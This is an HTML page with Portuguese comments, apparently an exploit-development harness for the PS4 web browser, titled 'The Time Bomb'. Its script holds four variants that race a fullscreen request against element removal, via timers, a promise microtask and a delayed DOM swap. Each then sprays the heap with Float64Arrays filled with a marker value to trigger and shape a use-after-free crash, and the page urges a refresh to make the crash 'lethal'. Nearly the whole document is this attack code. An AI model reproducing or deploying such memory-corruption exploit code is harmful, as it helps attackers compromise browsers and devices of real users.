<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 Suite v540000: The Time Bomb</title>
<style>
    body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding: 10px; }
    h1 { border-bottom: 2px solid #0f0; color: #fff; }
    .status { 
        border: 2px solid #fff; padding: 15px; margin-bottom: 20px; 
        font-size: 1.2em; background: #002; color: #fff; font-weight: bold;
    }
    
    button {
        display: block; width: 100%; padding: 25px; margin: 15px 0;
        background: #004; color: #fff; border: 2px solid #0f0;
        font-size: 20px; font-weight: bold; cursor: pointer; text-transform: uppercase;
    }
    button:hover { background: #0f0; color: #000; }
    
    #stage { background: #111; height: 100px; border: 1px solid #555; margin-top: 20px; transition: all 1s; }
</style>
</head>
<body>

<h1>v540000: THE TIME BOMB</h1>

<div class="status" id="msg">
    ESTRATÉGIA: CORRUPÇÃO COM ATRASO (DELAY)<br>
    CLIQUE -> FULLSCREEN -> AGUARDE
</div>

<button onclick="bomb(b01)">01. 100ms Animation Sniper</button>

<button onclick="bomb(b02)">02. 500ms Transition Swap</button>

<button onclick="bomb(b03)">03. Promise Microtask Race</button>

<button onclick="bomb(b04)">04. The Proven Crash (Optimized)</button>

<div id="stage">ALVO</div>

<script>
    const Stage = document.getElementById('stage');
    const Msg = document.getElementById('msg');
    
    // Spray Global (Ponteiros Falsos)
    let memory = [];
    // 0x4141... em Float64 para marcar o crash
    const poison = 2.121995791e-314; 

    function bomb(vectorFunc) {
        Stage.innerHTML = "";
        memory = [];
        
        // Configura o alvo
        const target = vectorFunc(Stage);
        
        // Pequeno delay para garantir que o alvo renderizou
        setTimeout(() => {
            if(target._prime) target._prime();
        }, 100);
    }

    // =================================================================
    // 01. 100ms Animation Sniper
    // Inicia Fullscreen -> Espera 100ms -> Destrói Elemento.
    // Tenta pegar o navegador desenhando o frame de expansão.
    // =================================================================
    function b01(stage) {
        const d = document.createElement('div');
        d.innerText = "100ms SNIPER";
        d.style.background = "red";
        d.style.transition = "all 2s"; // Animação CSS lenta
        stage.appendChild(d);

        d._prime = () => {
            d.onclick = () => {
                // 1. Inicia Fullscreen
                if (d.webkitRequestFullscreen) d.webkitRequestFullscreen();
                else if (d.requestFullscreen) d.requestFullscreen();
                
                // 2. A BOMBA (100ms depois)
                setTimeout(() => {
                    Msg.innerText = ">>> BOOM! (ELEMENT REMOVED) <<<";
                    // Remove o elemento que está expandindo
                    d.remove();
                    
                    // Spray Imediato
                    for(let i=0; i<5000; i++) {
                        const a = new Float64Array(16);
                        a.fill(poison);
                        memory.push(a);
                    }
                    
                    // Se não crashar sozinho, instrui o refresh
                    setTimeout(() => {
                        Msg.innerText = "SE NÃO CRASHOU: APERTE ATUALIZAR AGORA!";
                        Msg.style.background = "red";
                    }, 1000);
                }, 100);
            };
            // Simula clique (ou pede clique do usuário se falhar)
            Msg.innerText = ">>> CLIQUE NO BLOCO VERMELHO <<<";
        };
        return d;
    }

    // =================================================================
    // 02. 500ms Transition Swap
    // Espera a tela ficar cheia (aprox 500ms) e troca o conteúdo
    // violentamente, forçando um Recálculo de Estilo em Fullscreen.
    // =================================================================
    function b02(stage) {
        const d = document.createElement('div');
        d.innerText = "500ms SWAP";
        d.style.background = "blue";
        stage.appendChild(d);

        d._prime = () => {
            d.onclick = () => {
                if (d.webkitRequestFullscreen) d.webkitRequestFullscreen();
                else if (d.requestFullscreen) d.requestFullscreen();
                
                setTimeout(() => {
                    Msg.innerText = ">>> SWAPPING MEMORY <<<";
                    
                    // Destruição Total do Palco
                    stage.innerHTML = "";
                    
                    // Criação de estrutura de "veneno"
                    const fake = document.createElement('div');
                    fake.innerText = "POISONED";
                    fake.style.background = "green";
                    stage.appendChild(fake);
                    
                    // Tenta acessar propriedades do elemento antigo 'd' (Closure)
                    // Se o Fullscreen ainda tiver referência a 'd'...
                    try {
                        d.style.background = "yellow"; 
                    } catch(e){}
                    
                    // Spray
                    for(let i=0; i<5000; i++) memory.push(new Float64Array(100).fill(poison));
                    
                    Msg.innerText = "SE TELA VERDE/PRETA: APERTE ATUALIZAR!";
                }, 500);
            };
            Msg.innerText = ">>> CLIQUE NO BLOCO AZUL <<<";
        };
        return d;
    }

    // =================================================================
    // 03. Promise Microtask Race
    // Usa Microtasks (que têm prioridade sobre renderização) para
    // destruir o objeto "entre frames".
    // =================================================================
    function b03(stage) {
        const d = document.createElement('div');
        d.innerText = "PROMISE RACE";
        d.style.background = "purple";
        stage.appendChild(d);

        d._prime = () => {
            d.onclick = () => {
                if (d.webkitRequestFullscreen) d.webkitRequestFullscreen();
                else if (d.requestFullscreen) d.requestFullscreen();
                
                // Agenda destruição na Microtask Queue
                Promise.resolve().then(() => {
                    // Isso roda ANTES do próximo paint (desenho)
                    d.remove();
                    
                    // Spray
                    for(let i=0; i<2000; i++) memory.push(new Float64Array(32).fill(poison));
                    
                    Msg.innerText = ">>> MICROTASK EXECUTADA. APERTE ATUALIZAR! <<<";
                    Msg.style.background = "red";
                });
            };
            Msg.innerText = ">>> CLIQUE NO BLOCO ROXO <<<";
        };
        return d;
    }

    // =================================================================
    // 04. The Proven Crash (Optimized)
    // Uma versão refinada do Teste 1 anterior que funcionou.
    // Focada em garantir que o Refresh Manual seja 100% letal.
    // =================================================================
    function b04(stage) {
        const d = document.createElement('div');
        d.innerText = "KILL SWITCH";
        d.style.background = "#333";
        stage.appendChild(d);

        // Objeto complexo para corromper
        let complex = {
            el: d,
            data: new Array(1000).fill(1.1),
            child: { a: 1 }
        };

        d._prime = () => {
            d.onclick = () => {
                // 1. Fullscreen
                if (d.webkitRequestFullscreen) d.webkitRequestFullscreen();
                else if (d.requestFullscreen) d.requestFullscreen();
                
                // 2. Corrupção (Pre-Poisoning Otimizado)
                // Não removemos o elemento visualmente ainda para não cancelar o fullscreen
                // Mas matamos a referência JS
                
                setTimeout(() => {
                    complex = null; // Libera a referência raiz
                    
                    // Sobrescreve a memória onde 'complex' estava
                    // Usando intervalos para garantir persistência
                    setInterval(() => {
                        memory.push(new Float64Array(128).fill(poison));
                        if(memory.length > 10000) memory.shift(); // Ciclo de memória
                    }, 10);
                    
                    Msg.innerText = ">>> MEMÓRIA CORROMPIDA. APERTE ATUALIZAR AGORA! <<<";
                    Msg.style.background = "red";
                    Msg.classList.add("blink");
                    
                    // Destruição visual tardia
                    d.innerHTML = "<h1>DEAD</h1>";
                }, 200);
            };
            Msg.innerText = ">>> CLIQUE NO BLOCO CINZA <<<";
        };
        return d;
    }

</script>
<style>
    .blink { animation: b 0.5s infinite; }
    @keyframes b { 0% { opacity: 1; } 50% { opacity: 0; } }
</style>
</body>
</html>
